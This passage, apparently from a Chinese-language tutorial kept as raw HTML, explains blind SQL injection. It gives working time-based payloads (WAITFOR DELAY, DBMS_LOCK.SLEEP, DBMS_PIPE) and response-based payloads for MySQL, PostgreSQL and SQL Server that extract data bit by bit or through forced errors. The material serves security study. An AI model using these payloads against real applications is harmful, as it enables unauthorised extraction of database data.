string&#34;&gt;&#39;sa&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WAITFOR&lt;/span&gt; DELAY &lt;span class=&#34;token string&#34;&gt;&#39;00:00:05&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果用户名为sa，返回时间就大于5秒&lt;/p&gt;
&lt;p&gt;还有一种新技术，该技术使用两个通过逻辑“与”隔开的子查询，其中一个子查询的执行时间为很多秒，另一个子查询包含一个推断检查。如果检查失败(第x位为0)，第二个子查询将返回，第一个子查询则因受“与”子句的影响而提前中止。实际结果是，如果正在推断的位为1，那么请求将花费比位为0时更多的时间。（其他数据库通用）&lt;a href=&#34;https://archive.codeplex.com/?p=marathontool&#34;&gt;Marathon Tool - CodePlex Archive&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二分法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;;IF ASCII(SUBSTRING((...),i,1))&amp;gt;k WAITFOR DELAY &#39;00:00:05&#39;;-- 
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;
- 逐位

  ```sql
  ;IF ASCII (SUBSTRING ((...),i,1))&amp;amp;2^j=2^j WAITFOR DELAY &#39;00:00:05&#39;;--&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;Oracle延迟&#34;&gt;&lt;a href=&#34;#Oracle延迟&#34; class=&#34;headerlink&#34; title=&#34;Oracle延迟&#34;&gt;&lt;/a&gt;Oracle延迟&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt; DBMS_LOCK&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;oralce中许多SQL注入都指向DBMS_LOCK包，并且这个包必须在管理员下使用，同时oracle不支持堆叠查询，所以sleep(n)在SQL语句中不好利用&lt;/p&gt;
&lt;p&gt;如果注入点位于PL/SQL块中，则能利用&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;BITAND&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; DBMS_LOCK&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用DBMS_PIPE.RECEIVE_MESSAGE函数可以实现基于时间的 攻击&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;xxx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;aspx?test&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;test&lt;span class=&#34;token string&#34;&gt;&#39;OR 1 = CASE WHEN
SYS_CONTEXT(&#39;&lt;/span&gt;USERENV&lt;span class=&#34;token string&#34;&gt;&#39;, &#39;&lt;/span&gt;ISDBA&lt;span class=&#34;token string&#34;&gt;&#39;) = &#39;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; THEN DBMS_PIPE.RECEIVE_ MESSAGE(&#39;&lt;/span&gt;foo&#39;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;基于时间的推断应考虑的问题&#34;&gt;&lt;a href=&#34;#基于时间的推断应考虑的问题&#34; class=&#34;headerlink&#34; title=&#34;基于时间的推断应考虑的问题&#34;&gt;&lt;/a&gt;基于时间的推断应考虑的问题&lt;/h4&gt;&lt;p&gt;如果请求延迟很久，也可能是过载过高或者信道拥堵&lt;/p&gt;
&lt;p&gt;解决方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将延迟尽量设置高些以抵消其他延迟&lt;/li&gt;
&lt;li&gt;发送两个几乎相同的请求，比较两个延迟，一个可能是状态为0的延迟，一个是状态为1的延迟，加以推断&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;使用基于响应的请求&#34;&gt;&lt;a href=&#34;#使用基于响应的请求&#34; class=&#34;headerlink&#34; title=&#34;使用基于响应的请求&#34;&gt;&lt;/a&gt;使用基于响应的请求&lt;/h3&gt;&lt;p&gt;推断状态时，可以借助响应中包含的文本或在检查特定值时强制产生的错误。&lt;/p&gt;
&lt;h4 id=&#34;Mysql响应技术&#34;&gt;&lt;a href=&#34;#Mysql响应技术&#34; class=&#34;headerlink&#34; title=&#34;Mysql响应技术&#34;&gt;&lt;/a&gt;Mysql响应技术&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#返回两条结果&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;J&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;J&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#如果i位为1，条件为真，返回上面相同结果，i位为0则返回0条&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#平衡拆分技术&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#逐位方法(bit-by-bit)的拆分与平衡注入字符串为：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CURRENT_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#无法修改&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;IF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CURRENT_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; table_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#很明显，第二个子查询返回多行，这句SQL会报错，那么就会有两种状态&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用以PHP编写并以MySQL作为数据存储的应用时，在数据库查询执行过程中出现的错误不会产生引发通用错误页面的异常。调用页面必须检查mysql_query()是否返回FALSE,或者mysql_error()是否返回一个非空字符串。只要有一个条件成立，页面就会打印一个应用专用的错误消息。这样做的结果是，MySQL错误不会产生HTTP 500响应代码，而是 产生正常的200响应代码。&lt;/p&gt;
&lt;h4 id=&#34;PostgreSQL响应技术&#34;&gt;&lt;a href=&#34;#PostgreSQL响应技术&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL响应技术&#34;&gt;&lt;/a&gt;PostgreSQL响应技术&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; PAUSE &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--    &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#pause()是自定义的                                          &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#无法修改内容时，强制使用除以0的条件&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#很容易将它和拆分与平衡技术结合使用：&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;||(SELECT CASE(...)WHEN TRUE THEN 1/0 END)||&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;SQL-Server响应技术&#34;&gt;&lt;a href=&#34;#SQL-Server响应技术&#34; class=&#34;headerlink&#34; title=&#34;SQL Server响应技术&#34;&gt;&lt;/a&gt;SQL Server响应技术&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sa&#39;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;COUNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; reviews &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; review_author&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MadBob&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; ASCII&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SUBSTRING&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;k &lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;

